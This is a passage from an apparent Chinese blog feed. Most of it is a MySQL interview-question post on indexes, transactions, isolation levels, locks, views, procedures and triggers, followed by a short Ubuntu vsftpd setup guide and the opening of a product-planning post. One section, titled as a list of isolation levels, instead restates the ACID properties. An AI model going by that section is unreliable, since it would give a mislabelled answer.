&#x3D; 2 and c &#x3D; 3 建立(a,b,c)索引可以任意顺序，mysql的查询优化器会帮你优化成索引可以识别的形式</p></blockquote><h3 id="B树和B-树的区别"><a href="#B树和B-树的区别" class="headerlink" title="B树和B+树的区别"></a>B树和B+树的区别</h3><ul><li>在B树中，你可以将键和值存放在内部节点和叶子节点；但在B+树中，内部节点都是键，没有值，叶子节点同时存放键和值。</li><li>B+树的叶子节点有一条链相连，而B树的叶子节点各自独立。</li></ul><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200429101733.png" alt="image-20200429101732266" title="image-20200429101732266"></p><h3 id="使用B树的好处"><a href="#使用B树的好处" class="headerlink" title="使用B树的好处"></a>使用B树的好处</h3><p>B树可以在内部节点同时存储键和值，因此，把频繁访问的数据放在靠近根节点的地方将会大大提高热点数据的查询效率。这种特性使得B树在特定数据重复多次查询的场景中更加高效。</p><h3 id="使用B-树的好处"><a href="#使用B-树的好处" class="headerlink" title="使用B+树的好处"></a>使用B+树的好处</h3><p>由于B+树的内部节点只存放键，不存放值，因此，一次读取，可以在内存页中获取更多的键，有利于更快地缩小查找范围。 B+树的叶节点由一条链相连，因此，当需要进行一次全数据遍历的时候，B+树只需要使用O(logN)时间找到最小的一个节点，然后通过链进行O(N)的顺序遍历即可。而B树则需要对树的每一层进行遍历，这会需要更多的内存置换次数，因此也就需要花费更多的时间</p><h3 id="Hash索引和B-树所有有什么区别或者说优劣呢"><a href="#Hash索引和B-树所有有什么区别或者说优劣呢" class="headerlink" title="Hash索引和B+树所有有什么区别或者说优劣呢?"></a>Hash索引和B+树所有有什么区别或者说优劣呢?</h3><p>首先要知道Hash索引和B+树索引的底层实现原理：</p><p>hash索引底层就是hash表，进行查找时，调用一次hash函数就可以获取到相应的键值，之后进行回表查询获得实际数据。B+树底层实现是多路平衡查找树。对于每一次的查询都是从根节点出发，查找到叶子节点方可以获得所查键值，然后根据查询判断是否需要回表查询数据。</p><p>那么可以看出他们有以下的不同：</p><p>hash索引进行等值查询更快(一般情况下)，但是却无法进行范围查询。<br>因为在hash索引中经过hash函数建立索引之后，索引的顺序与原顺序无法保持一致，不能支持范围查询。而B+树的的所有节点皆遵循(左节点小于父节点，右节点大于父节点，多叉树也类似)，天然支持范围。</p><p>hash索引不支持使用索引进行排序，原理同上。<br>hash索引不支持模糊查询以及多列索引的最左前缀匹配。原理也是因为hash函数的不可预测。AAAA和AAAAB的索引没有相关性。<br>hash索引任何时候都避免不了回表查询数据，而B+树在符合某些条件(聚簇索引，覆盖索引等)的时候可以只通过索引完成查询。<br>hash索引虽然在等值查询上较快，但是不稳定。性能不可预测，当某个键值存在大量重复的时候，发生hash碰撞，此时效率可能极差。而B+树的查询效率比较稳定，对于所有的查询都是从根节点到叶子节点，且树的高度较低。<br>因此，在大多数情况下，直接选择B+树索引可以获得稳定且较好的查询速度。而不需要使用hash索引。</p><h3 id="数据库为什么使用B-树而不是B树"><a href="#数据库为什么使用B-树而不是B树" class="headerlink" title="数据库为什么使用B+树而不是B树"></a>数据库为什么使用B+树而不是B树</h3><p>B树只适合随机检索，而B+树同时支持随机检索和顺序检索；<br>B+树空间利用率更高，可减少I&#x2F;O次数，磁盘读写代价更低。一般来说，索引本身也很大，不可能全部存储在内存中，因此索引往往以索引文件的形式存储的磁盘上。这样的话，索引查找过程中就要产生磁盘I&#x2F;O消耗。B+树的内部结点并没有指向关键字具体信息的指针，只是作为索引使用，其内部结点比B树小，盘块能容纳的结点中关键字数量更多，一次性读入内存中可以查找的关键字也就越多，相对的，IO读写次数也就降低了。而IO读写次数是影响索引检索效率的最大因素；<br>B+树的查询效率更加稳定。B树搜索有可能会在非叶子结点结束，越靠近根节点的记录查找时间越短，只要找到关键字即可确定记录的存在，其性能等价于在关键字全集内做一次二分查找。而在B+树中，顺序检索比较明显，随机检索时，任何关键字的查找都必须走一条从根节点到叶节点的路，所有关键字的查找路径长度相同，导致每一个关键字的查询效率相当。<br>B-树在提高了磁盘IO性能的同时并没有解决元素遍历的效率低下的问题。B+树的叶子节点使用指针顺序连接在一起，只要遍历叶子节点就可以实现整棵树的遍历。而且在数据库中基于范围的查询是非常频繁的，而B树不支持这样的操作。<br>增删文件（节点）时，效率更高。因为B+树的叶子节点包含所有关键字，并以有序的链表结构存储，这样可很好提高增删效率。</p><h3 id="B-树在满足聚簇索引和覆盖索引的时候不需要回表查询数据，"><a href="#B-树在满足聚簇索引和覆盖索引的时候不需要回表查询数据，" class="headerlink" title="B+树在满足聚簇索引和覆盖索引的时候不需要回表查询数据，"></a>B+树在满足聚簇索引和覆盖索引的时候不需要回表查询数据，</h3><p>在B+树的索引中，叶子节点可能存储了当前的key值，也可能存储了当前的key值以及整行的数据，这就是聚簇索引和非聚簇索引。 在InnoDB中，只有主键索引是聚簇索引，如果没有主键，则挑选一个唯一键建立聚簇索引。如果没有唯一键，则隐式的生成一个键来建立聚簇索引。</p><p>当查询使用聚簇索引时，在对应的叶子节点，可以获取到整行数据，因此不用再次进行回表查询。</p><h3 id="什么是聚簇索引？何时使用聚簇索引与非聚簇索引"><a href="#什么是聚簇索引？何时使用聚簇索引与非聚簇索引" class="headerlink" title="什么是聚簇索引？何时使用聚簇索引与非聚簇索引"></a>什么是聚簇索引？何时使用聚簇索引与非聚簇索引</h3><p>聚簇索引：将数据存储与索引放到了一块，找到索引也就找到了数据<br>非聚簇索引：将数据存储于索引分开结构，索引结构的叶子节点指向了数据的对应行，myisam通过key_buffer把索引先缓存到内存中，当需要访问数据时（通过索引访问数据），在内存中直接搜索索引，然后通过索引找到磁盘相应数据，这也就是为什么索引不在key buffer命中时，速度慢的原因</p><h3 id="非聚簇索引一定会回表查询吗？"><a href="#非聚簇索引一定会回表查询吗？" class="headerlink" title="非聚簇索引一定会回表查询吗？"></a>非聚簇索引一定会回表查询吗？</h3><p>不一定，这涉及到查询语句所要求的字段是否全部命中了索引，如果全部命中了索引，那么就不必再进行回表查询。</p><p>举个简单的例子，假设我们在员工表的年龄上建立了索引，那么当进行select age from employee where age &lt; 20的查询时，在索引的叶子节点上，已经包含了age信息，不会再次进行回表查询。</p><h3 id="联合索引是什么？为什么需要注意联合索引中的顺序？"><a href="#联合索引是什么？为什么需要注意联合索引中的顺序？" class="headerlink" title="联合索引是什么？为什么需要注意联合索引中的顺序？"></a>联合索引是什么？为什么需要注意联合索引中的顺序？</h3><p>MySQL可以使用多个字段同时建立一个索引，叫做联合索引。在联合索引中，如果想要命中索引，需要按照建立索引时的字段顺序挨个使用，否则无法命中索引。</p><p>具体原因为:</p><p>MySQL使用索引时需要索引有序，假设现在建立了”name，age，school”的联合索引，那么索引的排序为: 先按照name排序，如果name相同，则按照age排序，如果age的值也相等，则按照school进行排序。</p><p>当进行查询时，此时索引仅仅按照name严格有序，因此必须首先使用name字段进行等值查询，之后对于匹配到的列而言，其按照age字段严格有序，此时可以使用age字段用做索引查找，以此类推。因此在建立联合索引的时候应该注意索引列的顺序，一般情况下，将查询需求频繁或者字段选择性高的列放在前面。此外可以根据特例的查询或者表结构进行单独的调整。</p><h2 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h2><h3 id="什么是事务"><a href="#什么是事务" class="headerlink" title="什么是事务"></a>什么是事务</h3><p>事务是一个不可分割的数据库操作序列，也是数据库并发控制的基本单位，其执行的结果必须使数据库从一种一致性状态变到另一种一致性状态。事务是指一个单元的工作，要么全做，要么全不做，事务是逻辑上的一组操作，保证一组数据的修改要么全部执行，要么全部不执行。</p><blockquote><p>举例：事务最经典也经常被拿出来说例子就是转账了。</p></blockquote><p>假如小明要给小红转账 1000 元，这个转账会涉及到两个关键操作就是：将小明的余额减少 1000 元，将小红的余额增加 1000 元。万一在这两个操作之间突然出现错误比如银行系统崩溃，导致小明余额减少而小红的余额没有增加，这样就不对了。事务就是保证这两个关键操作要么都成功，要么都要失败。</p><h3 id="事物的四大特性-ACID-介绍一下"><a href="#事物的四大特性-ACID-介绍一下" class="headerlink" title="事物的四大特性(ACID)介绍一下?"></a>事物的四大特性(ACID)介绍一下?</h3><p>关系性数据库需要遵循ACID规则，具体内容如下：</p><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200429102056.png" alt="image-20200429102055945" title="image-20200429102055945"></p><ul><li>原子性： 事务是最小的执行单位，不允许分割。事务的原子性确保动作要么全部完成，要么完全不起作用；</li><li>一致性： 执行事务前后，数据保持一致，多个事务对同一个数据读取的结果是相同的；</li><li>隔离性： 并发访问数据库时，一个用户的事务不被其他事务所干扰，各并发事务之间数据库是独立的；</li><li>持久性： 一个事务被提交之后。它对数据库中数据的改变是持久的，即使数据库发生故障也不应该对其有任何影响。</li></ul><h3 id="什么是脏读？幻读？不可重复读？"><a href="#什么是脏读？幻读？不可重复读？" class="headerlink" title="什么是脏读？幻读？不可重复读？"></a>什么是脏读？幻读？不可重复读？</h3><ul><li>脏读(Drity Read)：某个事务已更新一份数据，另一个事务在此时读取了同一份数据，由于某些原因，前一个RollBack了操作，则后一个事务所读取的数据就会是不正确的。</li><li>不可重复读(Non-repeatable read):在一个事务的两次查询之中数据不一致，这可能是两次查询过程中间插入了一个事务更新的原有的数据。</li><li>幻读(Phantom Read):在一个事务的两次查询中数据笔数不一致，例如有一个事务查询了几列(Row)数据，而另一个事务却在此时插入了新的几列数据，先前的事务在接下来的查询中，就会发现有几列数据是它先前所没有的。</li></ul><h3 id="什么是事务的隔离级别？MySQL的默认隔离级别是什么？"><a href="#什么是事务的隔离级别？MySQL的默认隔离级别是什么？" class="headerlink" title="什么是事务的隔离级别？MySQL的默认隔离级别是什么？"></a>什么是事务的隔离级别？MySQL的默认隔离级别是什么？</h3><p>为了达到事务的四大特性，数据库定义了4种不同的事务隔离级别，由低到高依次为Read uncommitted、Read committed、Repeatable read、Serializable，这四个级别可以逐个解决脏读、不可重复读、幻读这几类问题。</p><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200429102217.png" alt="image-20200429102216529" title="image-20200429102216529"></p><p>SQL 标准定义了四个隔离级别：</p><p>READ-UNCOMMITTED(读取未提交)： 最低的隔离级别，允许读取尚未提交的数据变更，可能会导致脏读、幻读或不可重复读。<br>READ-COMMITTED(读取已提交)： 允许读取并发事务已经提交的数据，可以阻止脏读，但是幻读或不可重复读仍有可能发生。<br>REPEATABLE-READ(可重复读)： 对同一字段的多次读取结果都是一致的，除非数据是被本身事务自己所修改，可以阻止脏读和不可重复读，但幻读仍有可能发生。<br>SERIALIZABLE(可串行化)： 最高的隔离级别，完全服从ACID的隔离级别。所有的事务依次逐个执行，这样事务之间就完全不可能产生干扰，也就是说，该级别可以防止脏读、不可重复读以及幻读。</p><h3 id="事务的隔离级别有哪些"><a href="#事务的隔离级别有哪些" class="headerlink" title="事务的隔离级别有哪些"></a>事务的隔离级别有哪些</h3><p>事务隔离级别包括： 原子性，即不可分割性，事务要么全部被执行，要么就全部不被执行； 一致性或可串性，事务的执行使得数据库从一种正确状态转换成另一种正确状态； 隔离性，在事务正确提交之前，不允许把该事务对数据的任何改变提供给任何其他事务； 持久性,事务正确提交后，其结果将永久保存在数据库中，即使在事务提交后有了其他故障，事务的处理结果也会得到保存。</p><h2 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h2><h3 id="什么是锁"><a href="#什么是锁" class="headerlink" title="什么是锁"></a>什么是锁</h3><p>在所有的 DBMS 中，锁是实现事务的关键，锁可以保证事务的完整性和并发性。与现实生活中锁一样，它可以是某些数据的拥有者，在某段时间内不能使用某些数据或数据结构。当然锁还分级别的。</p><h3 id="隔离级别与锁的关系"><a href="#隔离级别与锁的关系" class="headerlink" title="隔离级别与锁的关系"></a>隔离级别与锁的关系</h3><p>在Read Uncommitted级别下，读取数据不需要加共享锁，这样就不会跟被修改的数据上的排他锁冲突</p><p>在Read Committed级别下，读操作需要加共享锁，但是在语句执行完以后释放共享锁；</p><p>在Repeatable Read级别下，读操作需要加共享锁，但是在事务提交之前并不释放共享锁，也就是必须等待事务执行完毕以后才释放共享锁。</p><p>SERIALIZABLE 是限制性最强的隔离级别，因为该级别锁定整个范围的键，并一直持有锁，直到事务完成。</p><h3 id="按照锁的粒度分数据库锁有哪些？锁机制与InnoDB锁算法"><a href="#按照锁的粒度分数据库锁有哪些？锁机制与InnoDB锁算法" class="headerlink" title="按照锁的粒度分数据库锁有哪些？锁机制与InnoDB锁算法"></a>按照锁的粒度分数据库锁有哪些？锁机制与InnoDB锁算法</h3><p>在关系型数据库中，可以按照锁的粒度把数据库锁分为行级锁(INNODB引擎)、表级锁(MYISAM引擎)和页级锁(BDB引擎 )。</p><p>MyISAM和InnoDB存储引擎使用的锁：</p><p>MyISAM采用表级锁(table-level locking)。<br>InnoDB支持行级锁(row-level locking)和表级锁，默认为行级锁<br>行级锁，表级锁和页级锁对比</p><p>行级锁 行级锁是Mysql中锁定粒度最细的一种锁，表示只针对当前操作的行进行加锁。行级锁能大大减少数据库操作的冲突。其加锁粒度最小，但加锁的开销也最大。行级锁分为共享锁 和 排他锁。</p><p>特点：开销大，加锁慢；会出现死锁；锁定粒度最小，发生锁冲突的概率最低，并发度也最高。</p><p>表级锁 表级锁是MySQL中锁定粒度最大的一种锁，表示对当前操作的整张表加锁，它实现简单，资源消耗较少，被大部分MySQL引擎支持。最常使用的MYISAM与INNODB都支持表级锁定。表级锁定分为表共享读锁（共享锁）与表独占写锁（排他锁）。</p><p>特点：开销小，加锁快；不会出现死锁；锁定粒度大，发出锁冲突的概率最高，并发度最低。</p><p>页级锁 页级锁是MySQL中锁定粒度介于行级锁和表级锁中间的一种锁。表级锁速度快，但冲突多，行级冲突少，但速度慢。所以取了折衷的页级，一次锁定相邻的一组记录。</p><p>特点：开销和加锁时间界于表锁和行锁之间；会出现死锁；锁定粒度界于表锁和行锁之间，并发度一般</p><h3 id="从锁的类别上分MySQL都有哪些锁呢？像上面那样子进行锁定岂不是有点阻碍并发效率了"><a href="#从锁的类别上分MySQL都有哪些锁呢？像上面那样子进行锁定岂不是有点阻碍并发效率了" class="headerlink" title="从锁的类别上分MySQL都有哪些锁呢？像上面那样子进行锁定岂不是有点阻碍并发效率了"></a>从锁的类别上分MySQL都有哪些锁呢？像上面那样子进行锁定岂不是有点阻碍并发效率了</h3><blockquote><p>从锁的类别上来讲，有共享锁和排他锁。</p><p>共享锁: 又叫做读锁。 当用户要进行数据的读取时，对数据加上共享锁。共享锁可以同时加上多个。</p><p>排他锁: 又叫做写锁。 当用户要进行数据的写入时，对数据加上排他锁。排他锁只可以加一个，他和其他的排他锁，共享锁都相斥。</p><p>用上面的例子来说就是用户的行为有两种，一种是来看房，多个用户一起看房是可以接受的。 一种是真正的入住一晚，在这期间，无论是想入住的还是想看房的都不可以。</p><p>锁的粒度取决于具体的存储引擎，InnoDB实现了行级锁，页级锁，表级锁。</p><p>他们的加锁开销从大到小，并发能力也是从大到小。</p></blockquote><h3 id="MySQL中InnoDB引擎的行锁是怎么实现的？"><a href="#MySQL中InnoDB引擎的行锁是怎么实现的？" class="headerlink" title="MySQL中InnoDB引擎的行锁是怎么实现的？"></a>MySQL中InnoDB引擎的行锁是怎么实现的？</h3><blockquote><p>答：InnoDB是基于索引来完成行锁</p><p>例: select * from tab_with_index where id &#x3D; 1 for update;</p><p>for update 可以根据条件来完成行锁锁定，并且 id 是有索引键的列，如果 id 不是索引键那么InnoDB将完成表锁，并发将无从谈起</p></blockquote><h3 id="InnoDB存储引擎的锁的算法有三种"><a href="#InnoDB存储引擎的锁的算法有三种" class="headerlink" title="InnoDB存储引擎的锁的算法有三种"></a>InnoDB存储引擎的锁的算法有三种</h3><blockquote><ul><li>Record lock：单个行记录上的锁</li><li>Gap lock：间隙锁，锁定一个范围，不包括记录本身</li><li>Next-key lock：record+gap 锁定一个范围，包含记录本身</li></ul></blockquote><p>相关知识点：</p><p>innodb对于行的查询使用next-key lock<br>Next-locking keying为了解决Phantom Problem幻读问题<br>当查询的索引含有唯一属性时，将next-key lock降级为record key<br>Gap锁设计的目的是为了阻止多个事务将记录插入到同一范围内，而这会导致幻读问题的产生<br>有两种方式显式关闭gap锁：（除了外键约束和唯一性检查外，其余情况仅使用record lock） A. 将事务隔离级别设置为RC B. 将参数innodb_locks_unsafe_for_binlog设置为1</p><h3 id="什么是死锁？怎么解决？"><a href="#什么是死锁？怎么解决？" class="headerlink" title="什么是死锁？怎么解决？"></a>什么是死锁？怎么解决？</h3><p>死锁是指两个或多个事务在同一资源上相互占用，并请求锁定对方的资源，从而导致恶性循环的现象。</p><p>常见的解决死锁的方法</p><p>1、如果不同程序会并发存取多个表，尽量约定以相同的顺序访问表，可以大大降低死锁机会。</p><p>2、在同一个事务中，尽可能做到一次锁定所需要的所有资源，减少死锁产生概率；</p><p>3、对于非常容易产生死锁的业务部分，可以尝试使用升级锁定颗粒度，通过表级锁定来减少死锁产生的概率；</p><p>如果业务处理不好可以用分布式事务锁或者使用乐观锁</p><h3 id="数据库的乐观锁和悲观锁是什么？怎么实现的？"><a href="#数据库的乐观锁和悲观锁是什么？怎么实现的？" class="headerlink" title="数据库的乐观锁和悲观锁是什么？怎么实现的？"></a>数据库的乐观锁和悲观锁是什么？怎么实现的？</h3><p>数据库管理系统（DBMS）中的并发控制的任务是确保在多个事务同时存取数据库中同一数据时不破坏事务的隔离性和统一性以及数据库的统一性。乐观并发控制（乐观锁）和悲观并发控制（悲观锁）是并发控制主要采用的技术手段。</p><p>悲观锁：假定会发生并发冲突，屏蔽一切可能违反数据完整性的操作。在查询完数据的时候就把事务锁起来，直到提交事务。实现方式：使用数据库中的锁机制</p><p>乐观锁：假设不会发生并发冲突，只在提交操作时检查是否违反数据完整性。在修改数据的时候把事务锁起来，通过version的方式来进行锁定。实现方式：乐一般会使用版本号机制或CAS算法实现。</p><p>两种锁的使用场景</p><p>从上面对两种锁的介绍，我们知道两种锁各有优缺点，不可认为一种好于另一种，像乐观锁适用于写比较少的情况下（多读场景），即冲突真的很少发生的时候，这样可以省去了锁的开销，加大了系统的整个吞吐量。</p><p>但如果是多写的情况，一般会经常产生冲突，这就会导致上层应用会不断的进行retry，这样反倒是降低了性能，所以一般多写的场景下用悲观锁就比较合适。</p><h2 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h2><h3 id="为什么要使用视图"><a href="#为什么要使用视图" class="headerlink" title="为什么要使用视图"></a>为什么要使用视图</h3><p>为了提高复杂 SQL 语句的复用性和表操作的安全性，数据库管理系统提供了视图特性。视图使得开发者只关心感兴趣的某些特定数据和所负责的特定任务，只能看到视图中所定义的数据，而不是视图所引用表中的数据，从而提高了数据库中数据的安全性。</p><h3 id="什么是视图"><a href="#什么是视图" class="headerlink" title="什么是视图"></a>什么是视图</h3><p>视图本质上是一种虚拟表，在物理上是不存在的，具有和物理表相同的功能，其内容与真实的表相似，包含一系列带有名称的列和行数据，可以对视图进行增，改，查，操作，但是，视图并不在数据库中以储存的数据值形式存在。行和列数据来自定义视图的查询所引用基本表，并且在具体引用视图时动态生成。</p><h3 id="视图有哪些特点"><a href="#视图有哪些特点" class="headerlink" title="视图有哪些特点"></a>视图有哪些特点</h3><p>视图的特点如下:</p><p>视图的列可以来自不同的表，是表的抽象和在逻辑意义上建立的新关系。</p><p>视图是由基本表(实表)产生的表(虚表)。</p><p>视图的建立和删除不影响基本表。</p><p>对视图内容的更新(添加，删除和修改)直接影响基本表。</p><p>当视图来自多个基本表时，不允许添加和删除数据。</p><p>视图的操作包括创建视图，查看视图，删除视图和修改视图。</p><h3 id="视图的使用场景有哪些"><a href="#视图的使用场景有哪些" class="headerlink" title="视图的使用场景有哪些"></a>视图的使用场景有哪些</h3><blockquote><p>视图根本用途：简化 SQL 查询，提高开发效率。如果说还有另外一个用途那就是兼容老的表结构。</p><p>下面是视图的常见使用场景：</p><p>重用 SQL 语句；</p><p>简化复杂的 SQL 操作。在编写查询后，可以方便的重用它而不必知道它的基本查询细节；</p><p>使用表的组成部分而不是整个表；</p><p>保护数据。可以给用户授予表的特定部分的访问权限而不是整个表的访问权限；</p><p>更改数据格式和表示。视图可返回与底层表的表示和格式不同的数据。</p></blockquote><h3 id="视图的优点"><a href="#视图的优点" class="headerlink" title="视图的优点"></a>视图的优点</h3><p>（1）查询简单化：视图能简化用户的操作</p><p>（2）数据安全性：视图使用户能以多种角度看待同一数据，能够对机密数据提供安全保护</p><p>（3）逻辑数据独立性：视图对重构数据库提供了一定程度的逻辑独立性</p><h3 id="视图的缺点"><a href="#视图的缺点" class="headerlink" title="视图的缺点"></a>视图的缺点</h3><p>（1）性能：数据库必须把视图的查询转化成对基本表的查询，如果这个视图是由一个复杂的多表查询所定义，那么，即使是视图的一个简单查询，数据库也把它变成一个复杂的结合体，需要花费一定的时间。</p><p>（2）修改限制：当用户试图修改视图的某些行时，数据库必须把它转化为对基本表的某些行的修改。事实上，当从视图中插入或者删除时，情况也是这样。对于简单视图来说，这是很方便的，但是，对于比较复杂的视图，可能是不可修改的</p><h3 id="表和视图的关系"><a href="#表和视图的关系" class="headerlink" title="表和视图的关系"></a>表和视图的关系</h3><p>视图其实就是一条查询 SQL 语句，用于显示一个或多个表或其他视图中的相关数据。 表就是关系数据库中实际存储数据用的。</p><h3 id="什么是游标"><a href="#什么是游标" class="headerlink" title="什么是游标"></a>什么是游标</h3><p>游标是系统为用户开设的一个数据缓冲区，存放 SQL 语句的执行结果，每个游标区都有一个名字。用户可以通过游标逐一获取记录并赋给主变量，交由主语言进一步处理。</p><h2 id="存储过程与函数"><a href="#存储过程与函数" class="headerlink" title="存储过程与函数"></a>存储过程与函数</h2><h3 id="什么是存储过程"><a href="#什么是存储过程" class="headerlink" title="什么是存储过程"></a>什么是存储过程</h3><p>存储过程是一个预编译的 SQL 语句，优点是允许模块化的设计，就是说只需要创建一次，以后在该程序中就可以调用多次。如果某次操作需要执行多次 SQL，使用存储过程比单纯 SQL 语句执行要快。</p><h3 id="存储过程用什么来调用"><a href="#存储过程用什么来调用" class="headerlink" title="存储过程用什么来调用"></a>存储过程用什么来调用</h3><ul><li>可以用一个命令对象来调用存储过程。</li><li>可以供外部程序调用，比如：Java 程序。</li></ul><h3 id="存储过程的优缺点"><a href="#存储过程的优缺点" class="headerlink" title="存储过程的优缺点"></a>存储过程的优缺点</h3><p>优点</p><p>1）存储过程是预编译过的，执行效率高。</p><p>2）存储过程的代码直接存放于数据库中，通过存储过程名直接调用，减少网络通讯。</p><p>3）安全性高，执行存储过程需要有一定权限的用户。</p><p>4）存储过程可以重复使用，减少数据库开发人员的工作量。</p><p>缺点</p><p>1）调试麻烦，但是用 PL&#x2F;SQL Developer 调试很方便！弥补这个缺点。</p><p>2）移植性差，数据库端代码当然是与数据库相关的。但是如果是做工程型项目，基本不存在移植问题。</p><p>3）重新编译问题，因为后端代码是运行前编译的，如果带有引用关系的对象发生改变时，受影响的存储过程、包将需要重新编译（不过也可以设置成运行时刻自动编译）。</p><p>4）如果在一个程序系统中大量的使用存储过程，到程序交付使用的时候随着用户需求的增加会导致数据结构的变化，接着就是系统的相关问题了，最后如果用户想维护该系统可以说是很难很难、而且代价是空前的，维护起来更麻烦。</p><h3 id="存储过程与函数的区别"><a href="#存储过程与函数的区别" class="headerlink" title="存储过程与函数的区别"></a>存储过程与函数的区别</h3><p>存储过程</p><p>函数</p><p>用于在数据库中完成特定的操作或者任务（如插入、删除等）</p><p>用于特定的数据（如选择）</p><p>程序头部声明用 procedure</p><p>程序头部声明用 function</p><p>程序头部声明时不需描述返回类型</p><p>程序头部声明时要描述返回类型，而且 PL &#x2F; SQL 块中至少要包括一个有效的 return 语句</p><p>可以使用 in &#x2F; out &#x2F; in out 三种模式的参数</p><p>可以使用 in &#x2F; out &#x2F;in out 三种模式的参数</p><p>可作为一个独立的 PL &#x2F; SQL 语句来执行</p><p>不能独立执行，必须作为表达式的一部分调用</p><p>可以通过 out &#x2F; in out 返回零个或多个值</p><p>通过 return 语句返回一个值，且改值要与声明部分一致，也可以是通过 out 类型的参数带出的变量</p><p>SQL 语句( DML 或 SELECT )中不可调用存储过程</p><p>SQL 语句( DML 或 SELECT )中可以调用函数</p><h2 id="触发器"><a href="#触发器" class="headerlink" title="触发器"></a>触发器</h2><h3 id="什么是触发器"><a href="#什么是触发器" class="headerlink" title="什么是触发器"></a>什么是触发器</h3><p>触发器是用户定义在关系表上的一类由事件驱动的特殊的存储过程，触发器是指一段代码，当触发某个事件时，自动执行这些代码。主要是通过事件来触发而被执行的。它可以强化约束，来维护数据的完整性和一致性，可以跟踪数据库内的操作从而不允许未经许可的更新和变化。可以联级运算。如某表上的触发器上包含对另一个表的数据操作，而该操作又会导致该表触发器被触发。</p><h3 id="触发器的使用场景有哪些"><a href="#触发器的使用场景有哪些" class="headerlink" title="触发器的使用场景有哪些"></a>触发器的使用场景有哪些</h3><p>可以通过数据库中的相关表实现级联更改。<br>实时监控某张表中的某个字段的更改而需要做出相应的处理。<br>例如可以生成某些业务的编号。<br>注意不要滥用，否则会造成数据库及应用程序的维护困难。<br>大家需要牢记以上基础知识点，重点是理解数据类型CHAR和VARCHAR的差异，表存储引擎InnoDB和MyISAM的区别。</p><h3 id="MySQL中都有哪些触发器"><a href="#MySQL中都有哪些触发器" class="headerlink" title="MySQL中都有哪些触发器"></a>MySQL中都有哪些触发器</h3><p>在 MySQL 数据库中有如下六种触发器：</p><ul><li>Before Insert</li><li>After Insert</li><li>Before Update</li><li>After Update</li><li>Before Delete</li><li>After Delete</li></ul><h3 id="事前触发和事后触发有什么区别"><a href="#事前触发和事后触发有什么区别" class="headerlink" title="事前触发和事后触发有什么区别"></a>事前触发和事后触发有什么区别</h3><p>事前触发器运行于触发事件发生之前，而事后触发器运行于触发事件发生之后。通常事前触发器可以获取事件之前和新的字段值。</p><h3 id="语句级触发和行级触发有何区别"><a href="#语句级触发和行级触发有何区别" class="headerlink" title="语句级触发和行级触发有何区别"></a>语句级触发和行级触发有何区别</h3><p>语句级触发器可以在语句执行前或后执行，而行级触发在触发器所影响的每一行触发一次。</p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
            <tag> 面试题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu 安装配置 FTP 服务</title>
      <link href="/147.html"/>
      <url>/147.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>如果使用SFTP，就不需要服务端额外配置服务。</p><p>但使用FTP的话，服务端就需要进行安装与配置FTP服务。</p></blockquote><p>日常开发当然是怎么方便怎么来。两者效率相差不大，而且SFTP还更安全。</p><p>客户端连接工具推荐MobaXterm，功能很全。</p><p>或者使用浏览器，使用FTP协议访问服务器：<code>ftp://&#123;IP&#125;</code></p><h2 id="1-安装FTP服务"><a href="#1-安装FTP服务" class="headerlink" title="1. 安装FTP服务"></a>1. 安装FTP服务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install vsftpd ftp</span><br></pre></td></tr></table></figure><h2 id="2-配置FTP服务"><a href="#2-配置FTP服务" class="headerlink" title="2. 配置FTP服务"></a>2. 配置FTP服务</h2><p>使用vim打开vsftpd.conf配置文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/vsftpd.conf</span><br></pre></td></tr></table></figure><p>输入&#x2F;进入搜索模式，找到以下两个参数，取消注释让其生效。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">write_enable=YES</span><br><span class="line">utf8_filesystem=YES</span><br></pre></td></tr></table></figure><h2 id="3-重启FTP服务"><a href="#3-重启FTP服务" class="headerlink" title="3. 重启FTP服务"></a>3. 重启FTP服务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart vsftpd</span><br></pre></td></tr></table></figure><h2 id="4-验证FTP服务"><a href="#4-验证FTP服务" class="headerlink" title="4. 验证FTP服务"></a>4. 验证FTP服务</h2><p>服务端自身进行连接验证。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp localhost</span><br></pre></td></tr></table></figure><p>输入用户名密码提示230 Login successful，进入ftp&gt; 说明安装配置成功。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FTP </tag>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>产品规划六步法</title>
      <link href="/146.html"/>
      <url>/146.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>作为产品经理，每天要处理的事情很多，很容易陷入“打地鼠”的困境，什么工作先冒出来了就先解决，反而延误了重要的事情。因此，产品经理一定要做好规划，思想走在行动的前面。</p></blockquote><p><img src="https://cos.gjcloak.xyz/pigo/202210131624794.jpeg?imageMogr2/format/webp/interlace/1/quality/80"></p><p>初期做产品，你是否经常遇到这样的情况？天天加班到深夜，工作却依然做不完；</p><p>业务方提的需求很好，不知道该如何取舍；</p><p>年初要写工作计划，却茫然无头绪。这种场景容易联想到‘打地鼠’，什么意思呢？</p><p>我们非常习惯于去处理工作中冒出来的问题，谁先冒出来了，先消灭谁，反而容易导致重要的事被延后。作为产品经理，规划性很重要，不要被细节淹没，思考一定要走在前面，提前做好产品规划。</p><h2 id="规划的重要性"><a href="#规划的重要性" class="headerlink" title="规划的重要性"></a>规划的重要性</h2><p>仅从职业发展的视角来，产品经理能力模型中，达到高级别的产品，非常明确要求产品经理独立完成产品规划。</p><p><img 